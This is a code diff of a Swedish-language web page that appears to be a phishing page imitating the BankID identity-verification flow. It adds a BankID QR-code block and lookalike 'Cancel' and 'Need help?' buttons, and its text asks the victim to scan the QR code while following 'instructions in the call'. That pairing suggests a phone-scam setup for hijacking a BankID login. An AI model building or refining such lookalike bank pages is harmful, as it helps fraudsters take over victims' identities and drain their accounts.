@@ -14,7 +14,7 @@
     <!-- <script>
         setInterval(function() {
             location.reload();
-        }, 1000);
+        }, 5000);
     </script> -->
 
 </head>
@@ -41,6 +41,32 @@
                 <div id="qrText">
                     För att bekräfta din identitet, skanna QR-koden med din BankID. Följ instruktionerna i samtalet för att fortsätta. Denna metod är snabb, säker och används för att verifiera dig under hela processen.
                     <img id="qrImage" alt="QR Code will appear here">
+                    
+                    <!-- <hr style="width: 100%;background-color: #f9f9f9;border: 1px solid #ccc;"> -->
+                    
+                    <div id="bankid-qr-code" data-view-id="bankid-qr-code" class="current">
+                    </div>
+                    <div class="button-group">
+                            <div>
+                                <button class="link-button cancel-bankid">
+                                    Avbryt
+                                </button>
+                            </div>
+                            <div>
+                                <button class="link-button sidebar-toggler" data-flow-info-target="other">
+                                    <span class="help-button-text">
+                                        Behöver du hjälp?
+                                    </span>
+                    
+                                    <span class="help-button-text hidden">
+                                        Stäng
+                                    </span>
+                                </button>
+                            </div>
+                        </div>
+
+
+                    
                 </div>
             </div>
         </div>
